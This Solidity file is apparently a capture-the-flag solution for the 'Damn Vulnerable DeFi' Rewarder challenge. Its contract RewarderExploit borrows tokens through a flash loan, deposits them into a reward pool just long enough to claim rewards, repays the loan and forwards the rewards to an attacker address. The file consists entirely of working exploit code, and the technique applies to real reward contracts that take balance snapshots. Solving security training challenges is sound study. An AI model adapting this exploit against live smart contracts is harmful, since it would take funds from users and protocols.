// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";
import "hardhat/console.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
    function receiveFlashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

contract RewarderExploit {
    uint256 constant public MAX_INT_NUMBER = 1000000000000000000000000;
    using Address for address;
    IFlashLoanerPool immutable flashLoanPool;
    IRewarderPool immutable rewardPool;
    address immutable attackerAddress;
    uint immutable tokensAmount;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    constructor(address _attackerAddress, address _flashLoanPool, address _rewardPool, address _vTokenAddress, address _rTokenAddress, uint _tokensAmount) {
        flashLoanPool = IFlashLoanerPool(_flashLoanPool);
        rewardPool = IRewarderPool(_rewardPool);
        tokensAmount = _tokensAmount;
        liquidityToken = DamnValuableToken(_vTokenAddress);
        rewardToken = RewardToken(_rTokenAddress);
        attackerAddress = _attackerAddress;
    }

    function attack() external {
        console.log('BEGIN\n\n\n');
        flashLoanPool.flashLoan(tokensAmount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), MAX_INT_NUMBER);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
        uint256 rewards = rewardPool.distributeRewards();
        rewardToken.transfer(attackerAddress, rewards);
    }
}